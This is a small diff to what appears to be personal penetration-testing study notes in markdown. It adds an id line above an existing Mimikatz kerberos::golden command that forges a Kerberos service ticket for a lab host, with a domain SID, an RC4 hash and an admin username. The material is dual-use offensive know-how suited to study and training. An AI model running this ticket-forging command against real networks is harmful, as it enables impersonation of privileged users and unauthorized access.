@@ -27,6 +27,7 @@ public:: true
 	- From Windows
 	  id:: 6568a340-887a-4e0e-9515-0344e4728aaa
 		- With [[Mimikatz]]
+		  id:: 656a21e7-a8f6-4b59-9b30-521a3268a8f0
 		  ```
 		  kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 		  ```
